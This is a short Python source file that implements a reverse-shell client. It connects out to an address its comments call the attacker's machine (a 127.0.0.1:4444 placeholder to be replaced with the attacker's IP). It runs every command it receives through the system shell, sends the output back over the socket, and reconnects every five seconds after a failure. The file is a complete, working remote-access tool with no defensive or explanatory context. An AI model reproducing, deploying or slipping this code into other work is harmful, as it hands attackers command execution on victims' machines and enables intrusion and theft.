import socket
import subprocess
import os
import sys

def connect_to_server():
    try:
        # Connect to attacker's machine
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('127.0.0.1', 4444))  # Change IP to attacker's IP
        
        while True:
            # Receive command from server
            command = client_socket.recv(1024).decode()
            
            if command.lower() == 'exit':
                break
            
            # Execute command
            try:
                # Change directory command
                if command.startswith('cd '):
                    os.chdir(command[3:])
                    output = f"Changed to: {os.getcwd()}"
                
                # Regular command execution
                else:
                    # Run command and capture output
                    process = subprocess.Popen(command, 
                                             shell=True,
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE,
                                             stdin=subprocess.PIPE)
                    
                    output, error = process.communicate()
                    
                    if error:
                        output = error
                    elif not output:
                        output = b"Command executed successfully"
                
                # Send output back to server
                if isinstance(output, str):
                    output = output.encode()
                
                client_socket.send(output)
                
            except Exception as e:
                error_msg = f"Error: {str(e)}".encode()
                client_socket.send(error_msg)
                
    except Exception as e:
        print(f"Connection error: {e}")
        # Try to reconnect after 5 seconds
        import time
        time.sleep(5)
        connect_to_server()

if __name__ == "__main__":
    connect_to_server()